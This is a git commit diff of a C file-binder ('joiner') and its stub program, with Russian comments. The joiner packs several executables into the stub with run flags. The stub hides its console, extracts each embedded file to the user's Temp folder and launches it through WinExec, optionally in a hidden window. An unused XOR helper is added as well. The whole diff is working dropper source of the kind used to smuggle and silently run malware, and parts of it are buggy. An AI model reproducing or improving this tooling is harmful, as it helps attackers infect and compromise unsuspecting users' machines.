620aa623ef3cb271ce6a5fdbea7a72360ad38c2d
CSharpeProgrammer <97300152+CSharpeProgrammer@users.noreply.github.com>
2024-06-12 13:23:09 +0700

    v. 1.0

--- joiner.c
+++ joiner.c
@@ -2,9 +2,15 @@
 #include <stdlib.h>
 #include <windows.h>
 
+char crypt(char key, char data)
+{
+	return data^key;
+}
+
 int main(int argc, char * argv[]) {
 	FILE *f1, *f2;	//дескрипторы файлов
 	char buf;	//буфер для символов
+	char buf1 = 'f';
 	char stars[5]= {'*','*','*','*','*'}; 	//разделитель файлов
 	f1 = fopen(argv[2], "wb");	//открываем архив для записи
 	f2 = fopen(argv[1], "rb");	//открываем распаковщик для чтения
@@ -15,25 +21,30 @@ int main(int argc, char * argv[]) {
 			fwrite(&buf, sizeof(buf), 1, f1);	//пишем в файл
 	}
 	fclose(f2); //закрываем распоковщик
-	fwrite(&stars, sizeof(stars), 1, f1); //пишем разделитель
-	f2 = fopen(argv[3], "rb");	//открываем первый файл для чтения
-	printf("writing first file...\n");
-	while(!feof(f2))	//цикл до конца файл
+	fclose(f1); //закрываем архив
+	for(int i = 0; i<argc-2;i++)
 	{
-		if(fread(&buf, 1, sizeof(buf), f2)>0)	//чтение из файла
-			fwrite(&buf, sizeof(buf), 1, f1);	//пишем в файл
+		f1 = fopen(argv[2], "ab");
+		fwrite(&stars, sizeof(stars), 1, f1); //пишем разделитель
+		buf1 = (int)(atoi(argv[5+i*3])); //пишем атрибуты(запуск после распаковки, режим отображения, ..?)
+		fwrite(&buf1, 1, 1, f1);
+		fwrite(argv[4+i*3], 10, 1, f1); //пишем имя первого файла
+		fwrite(&stars, sizeof(stars), 1, f1); //пишем разделитель
+		f2 = fopen(argv[3+i*3], "rb");	//открываем первый файл для чтения
+		printf("writing file number %d...\n", i+1);
+		buf1='f';
+		while(!feof(f2))	//цикл до конца файл
+		{
+			if(fread(&buf, 1, sizeof(buf), f2)>0)	//чтение из файла
+			{
+				buf1=buf;
+				fwrite(&buf1, sizeof(buf), 1, f1);	//пишем в файл
+			}
+		}
+		printf("file number %d wrote\n", i+1);
+		fclose(f2);	//закрываем первый файл
+		fclose(f1);	//закрываем архив
 	}
-	fclose(f2);	//закрываем первый файл
-	fwrite(&stars, sizeof(stars), 1, f1);	//пишем разделитель
-	f2 = fopen(argv[4], "rb");	//открываем второй файл для чтения
-	printf("writing second file...\n");
-	while(!feof(f2))	//цикл до конца файл
-	{
-		if(fread(&buf, 1, sizeof(buf), f2)>0)	//чтение из файла
-			fwrite(&buf, sizeof(buf), 1, f1);	//пишем в файл
-	}
-	fclose(f2);	//закрываем второй файл
-	fclose(f1);	//закрываем архив
 	printf("complite!");
 	getchar();	//ожидание нажатия Enter
 	return EXIT_SUCCESS;	//завершение программы
--- null.c
+++ null.c
@@ -1,58 +1,84 @@
 #include <stdio.h>
 #include <stdlib.h>
+#include <string.h>
 #include <windows.h>
 
+char crypt(char key, char data)
+{
+	return data^key;
+}
 int main(int argc, char * argv[]) {
 	FreeConsole();	//скрываем консоль
     char buff[100];	//буфер для конконации
     DWORD dw=100;
+	char buf1 = 'f';
     char buf;	//буфер для символов
     int i=0;	//счётчик
-    int trigger1=0;
+    int count=0;
+    int trig=0;
+	char atributes=0;
     char users[11] = "C:\\Users\\";
     char path[MAX_PATH];
     char first[MAX_PATH];
     char next[24] = "\\AppData\\Local\\Temp\\";
     GetUserName(buff, &dw);
     snprintf(path, sizeof path, "%s%s%s", users, buff, next );	//получаем путь в C:\Users\username\AppData\local\Temp
-    snprintf(first, sizeof first, "%s%s", path, "\\source1.exe"); //путь до первого файла
     FILE *f1, *f2;	//дискрипторы файлов
-    f1= fopen(argv[0], "rb");	//открываем архв для чтения(самого себя)
-    f2=fopen(first, "wb");	//открываем первый файл для чтения
-	while(!feof(f1))	//цикл до конца файла
-	{
-		if(fread(&buf, 1, sizeof(buf), f1)>0)	//чтение из файла
-		{
-			if(trigger1==1)	//если триггер==1 пишем первый файл
+    f1 = fopen(argv[0], "rb");
+    while(!feof(f1))
+    {
+    	if(fread(&buf, 1, sizeof(buf), f1)>0)
+    	{
+			if(trig==3)
 			{
-				fwrite(&buf, sizeof(buf), 1, f2);
+				memset(first, 0, sizeof first);
+				snprintf(first, sizeof first, "%s%s", path, buff);
+				f2 = fopen(first, "wb");
+				trig++;
+				count=0;
 			}
-			if(trigger1==2)	//если триггер==2
+			if(trig==4)
 			{
-				fclose(f2);	//закрываем файл
-				snprintf(first, sizeof first, "%s%s", path, "\\source2.exe");	//путь до второго файла
-				f2=fopen(first, "wb");		//открываем фторой файл для записи
-				trigger1++;	//увеличиваем триггер на 1
+				buf1=buf;
+				fwrite(&buf1, sizeof(buf), 1, f2);
 			}
-			if(trigger1==3)	//если триггер==3
+			if(trig==2)
 			{
-				fwrite(&buf, sizeof(buf), 1, f2);	//пишем второй файл
+				if(buf != '*')
+				{
+					buff[count]=buf;
+					count++;
+				}
 			}
-			if(buf=='*')	//если видим *
+			if(trig==1) 
 			{
-				i++;	//увеличеваем i на 1
+				atributes = buf;
+				trig++;
+				memset(buff, 0, 100);
 			}
-			else i=0;	//иначе i=0
-			if(i==5)	//если видим 5 *
+    		if(buf=='*') i++;
+			else i = 0;
+			if(i==5) trig++; 
+			if(trig==5)
 			{
-				i=0;	//i=0
-				trigger1++;	// триггер+1
+				fclose(f2);
+				switch(atributes)
+				{
+					case (char)(0) : WinExec(first, 0);
+					case (char)(1) : WinExec(first, 1);
+				}
+				trig=1;
 			}
 		}
 	}
-	fclose(f2);	//закрываем второй файл
-    fclose(f1);	//закрываем архив
-    snprintf(first, sizeof first, "%s%s", path, "\\source1.exe");	//путь до первого файла
-    WinExec(first, SW_NORMAL);	//открываем первый файл
+	fclose(f1);
+	fclose(f2);
+				switch(atributes)
+				{
+					case (char)(0) : WinExec(first, 0);
+					case (char)(1) : WinExec(first, 1);
+				}
+
+    getchar();
 	return EXIT_SUCCESS;	//завершение программы
 	}
